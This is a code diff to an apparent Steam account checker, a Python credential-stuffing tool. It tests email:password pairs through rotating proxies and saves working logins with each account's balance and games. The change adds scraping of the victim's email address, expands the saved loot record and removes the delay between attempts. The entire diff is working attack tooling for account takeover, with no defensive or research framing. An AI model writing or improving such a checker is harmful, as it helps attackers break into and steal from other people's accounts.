@@ -2,7 +2,7 @@ from modules.variables import Checker
 from modules.functions import bad_proxy, log, return_proxy,save,set_proxy
 from json import loads
 from requests import Session
-from time import sleep, time
+from time import time
 from rsa import encrypt,PublicKey
 from base64 import b64encode
 from urllib.parse import quote
@@ -97,9 +97,12 @@ def check(email:str,password:str):
                 for game in games_list:
                     games.append(game["name"])
                 
-                balance = s.get("https://store.steampowered.com/account/",cookies={"steamLoginSecure":cookie}).text.split('<div class="accountData price">')[1].split("</div>")[0]
+                r = s.get("https://store.steampowered.com/account/",cookies={"steamLoginSecure":cookie})
+                balance = r.text.split('<div class="accountData price">')[1].split("</div>")[0]
+                email = r.text.split('Email address:</span> <span class="account_data_field">')[1].split('</span>')[0]
+
                 if not Checker.cui: log("good",':'.join([username,password]),"Steam")
-                save("Steam","good",Checker.time,':'.join([username,password])+f" | Games: {games} | Balance: {balance} | Email: {email}")
+                save("Steam","good",Checker.time,':'.join([username,password])+f" | Total Games: {len(games)} | Balance: {balance} | Email: {email} | Games List: [{', '.join(games)}]")
                 Checker.good += 1
                 return_proxy(proxy)
                 return
@@ -108,4 +111,4 @@ def check(email:str,password:str):
             return_proxy(proxy)
             Checker.errors += 1
         
-        sleep(0.1)
+        
